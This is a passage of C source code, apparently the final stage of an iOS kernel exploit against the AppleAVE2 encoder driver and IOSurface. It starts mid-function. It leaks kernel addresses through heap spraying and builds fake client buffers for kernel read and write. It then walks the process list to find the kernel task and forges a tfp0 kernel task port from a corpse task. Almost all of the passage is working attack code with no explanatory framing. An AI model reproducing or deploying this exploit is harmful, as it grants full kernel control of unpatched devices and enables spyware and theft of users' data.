            magic_addr = *(uint64_t*)(aaa+0x40);
            if(magic_addr)
                break;
        }
    }
    
    if(magic_addr == 0){
        do{
            add_new_client();
            spray_client();
            
            ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid);
            ccc = ccc + 0x10;
            for(int i=0; i<TT1_holes_count; i++){
                char *aaa = ccc + 0x80*i;
                
                if(((*(uint64_t*)(aaa+0x10) == 0) || (*(uint64_t*)(aaa+0x10) == kObject_AppleAVE2Driver)) && (*(uint64_t*)(aaa+0x20) == kObject_IOSurface)){
                    magic_addr = *(uint64_t*)(aaa+0x40);
                    if(magic_addr)
                        break;
                }
            }
            remove_client();
        }while(!magic_addr);
    }
    printf("magic_addr: 0x%llx\n", magic_addr);
    usleep(100 * 1000);
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    prep_redirect_prev_clientbuf(magic_addr + 0x24000);
    
    add_new_client();
    TT2_release_all();
    
    *(uint32_t*)(inputmap_InitInfo + 13232) = 1;
    encode_client_normal(0);
    *(uint64_t*)(inputmap_InitInfo + 56) = 0;
    empty_kernel_40_mem(kObject_AppleAVE2Driver + 0x400 - 40);
    
    uint64_t last_v = 0;
    uint64_t kObject_clientbuf = 0;
    uint32_t howmany = 0;
    for(;;){
        kObject_clientbuf = temp_kernel_reading_categ3(kObject_AppleAVE2Driver + 0x400);
        kObject_clientbuf |= 0xffffffe000000000;
        debugPrint("kObject_clientbuf_i: 0x%llx\n", kObject_clientbuf);
        if(last_v && (kObject_clientbuf > last_v)){
            if((kObject_clientbuf - last_v) == 0x2c000){
                if((uint16_t)kObject_clientbuf != 0x0000){
                    debugPrint(" Found the right clientbuf! 0x%llx\n", kObject_clientbuf);
                    break;
                }
            }
        }
        if(last_v == 0){
            if((uint16_t)kObject_clientbuf != 0x0000){
                debugPrint(" Found the right clientbuf! 0x%llx\n", kObject_clientbuf);
                break;
            }
        }
        last_v = kObject_clientbuf;
        if(add_new_client() == 1){
            // when client list is full
            errorPrint("%s", "client list is full.\n");
            for(int i=0; i<howmany; i++){
                remove_client();
            }
            last_v = 0;
            add_new_client();
            encode_client_normal(0);
            howmany = 1;
        }
        else{
            // when it's not full
            encode_client_normal(0);
            howmany ++;
        }
    }
    usleep(100 * 1000);
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    uint64_t the_prev_clientbuf = temp_kernel_reading_categ3(kObject_clientbuf + 0x29b60);
    the_prev_clientbuf |= 0xffffffe000000000;
    debugPrint("the_prev_clientbuf: 0x%llx\n", the_prev_clientbuf);
    usleep(100 * 1000);
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    uint64_t kObject_AppleAVE2UserClient = temp_kernel_reading_categ5(the_prev_clientbuf);
    kObject_AppleAVE2UserClient |= 0xffffffe000000000;
    debugPrint("kObject_AppleAVE2UserClient: 0x%llx\n", kObject_AppleAVE2UserClient);
    usleep(100 * 1000);
    
    printf("Setting up new kernel r/w primitives...\n");
    
    for(int i=0; i<10; i++){prep_fake_clientbuf(kObject_AppleAVE2UserClient);}
    empty_kernel_40_mem(kObject_AppleAVE2Driver + 0x3DA);
    
    KernelWrite_8bytes(the_prev_clientbuf, kObject_AppleAVE2UserClient);
    
    /*uint64_t kernel_page = surface_vtable & ~0xfff;
    while (true){
        uint32_t hdr = KernelRead_4bytes(kernel_page);
        if (hdr == 0xfeedfacf){
            kaslr = (kernel_page - 0xFFFFFFF007004000);
            break;
        }
        kernel_page -= 0x1000;
    }
    printf("kaslr: 0x%x\n", (uint32_t)kaslr);
    usleep(100 * 1000);*/
    
    uint64_t userClientOwner = KernelRead_8bytes(kObject_AppleAVE2UserClient + 0xa0);
    /*if (KernelRead_8bytes(userClientOwner + 0x18) == kObject_AppleAVE2UserClient){
        printf("Got uco!\n");
    }*/
    uint64_t userClientTask = KernelRead_8bytes(userClientOwner);
    
    uint64_t anyTask = userClientTask;
    uint64_t anyProc = 0;
    while (anyTask){
        uint64_t proc = KernelRead_8bytes(anyTask + OFFSET_task_bsd_info);
        uint64_t task2 = KernelRead_8bytes(proc + OFFSET_bsd_info_task);
        
        if (task2 == anyTask && anyTask != userClientTask){
            anyProc = proc;
            break;
        }
        anyTask = KernelRead_8bytes(anyTask + OFFSET_task_prev);
    }
    
    uint64_t allProc = 0;
    debugPrint("%s","Searching for our_proc & anyProc ...\n");
    while (anyProc != 0) {
        if (!our_proc_kAddr){
            uint32_t pid = KernelRead_4bytes(anyProc + OFFSET_bsd_info_pid);
            if (pid == getpid()){
                printf("found! our_proc: 0x%llx\n", anyProc);
                our_proc_kAddr = anyProc;
            }
        }
        if (our_proc_kAddr){
            uint64_t nextProc = KernelRead_8bytes(anyProc + 8);
            if (nextProc == 0 || KernelRead_8bytes(nextProc) != anyProc){
                printf("Found allproc! 0x%llx\n", anyProc);
                allProc = anyProc;
                break;
            }
        }
        
        anyProc = KernelRead_8bytes(anyProc + 0x8);
    }
    
    anyProc = KernelRead_8bytes(allProc);
    uint64_t kernelProc = 0;
    while (anyProc != 0){
        uint32_t pid = KernelRead_4bytes(anyProc + OFFSET_bsd_info_pid);
        if (pid == 0){
            kernelProc = anyProc;
            break;
        }
        anyProc = KernelRead_8bytes(anyProc);
    }
    
    uint64_t kernel_task_kAddr = KernelRead_8bytes(kernelProc + OFFSET_bsd_info_task);
    debugPrint("found! kernel_task: 0x%llx\n", kernel_task_kAddr);
    
    our_task_kAddr = KernelRead_8bytes(our_proc_kAddr + OFFSET_bsd_info_task);
    debugPrint("found! our_task: 0x%llx\n", our_task_kAddr);
    
    uint64_t kernel_map_kAddr = KernelRead_8bytes(kernel_task_kAddr + OFFSET_task_vm_map);
    debugPrint("kernel_map_kAddr: 0x%llx\n", kernel_map_kAddr);
    
    printf("Setting up tfp0...\n");
    
    mach_port_t corpse_task = MACH_PORT_NULL;
    task_generate_corpse(mach_task_self_, &corpse_task);
    
    uint64_t corpse_task_port = find_port(corpse_task);
    
    uint64_t fake_task = KernelRead_8bytes(corpse_task_port + OFFSET_ipc_port_ip_kobject);
    
    KernelWrite_8bytes(fake_task + OFFSET_task_vm_map, kernel_map_kAddr);
    
    if (corpse_task != MACH_PORT_NULL){
        tfp0_port = corpse_task;
    }
    
    printf("tfp0_port: 0x%x\n", tfp0_port);
    
    KernelWrite_8bytes(corpse_task_port + OFFSET_ipc_port_io_references, 0xf00d);
    KernelWrite_8bytes(corpse_task_port + OFFSET_ipc_port_ip_srights, 0xf00d);
    
    KernelWrite_4bytes(corpse_task + OFFSET_task_ref_count, 99);
    KernelWrite_4bytes(corpse_task + OFFSET_task_message_app_suspended, 1);
    KernelWrite_4bytes(corpse_task + OFFSET_task_active, 1);
    
    printf("Cleaning Up...\n");
    
    /*{
        uint64_t retdata = 0;
        vm_size_t outsize = 0x8;
        int kk = vm_read_overwrite(tfp0_port, 0xfffffff007004000 + kaslr, 0x8, (vm_address_t)&retdata, &outsize);
        printf(" tfp0 test read: (%d)0x%x outdata: 0x%llx\n", kk, kk, retdata);
    }*/
    
    // shutting down r/w pritmitives..
    KernelWrite_4bytes(kObject_AppleAVE2Driver + 0x400, (uint32_t)(kObject_clientbuf));
    for(int i=0; i<10; i++){clean_fake_clientbuf();}
    for(int i=0; i<7; i++){
        remove_client();
    }
    for(int i=0; i<howmany; i++){
        remove_client();
    }
    IOSurfaceRootUserClient_remove_surface_map(surface_ioconn, InitInfo_surfaceId);
    Send_notify_msg();
    
    printf("done\n");}
